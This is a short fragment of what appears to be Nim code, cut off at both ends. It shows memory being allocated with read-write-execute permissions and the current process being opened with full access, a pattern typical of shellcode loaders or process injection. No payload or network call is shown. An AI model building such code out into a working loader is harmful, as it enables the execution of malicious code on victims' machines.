        MEM_COMMIT,
        PAGE_EXECUTE_READ_WRITE
        )
    else:
        let tProcess2 = GetCurrentProcessId()

        var pHandle2: HANDLE = OpenProcess(PROCESS_ALL_ACCESS, FALSE, tProcess2)

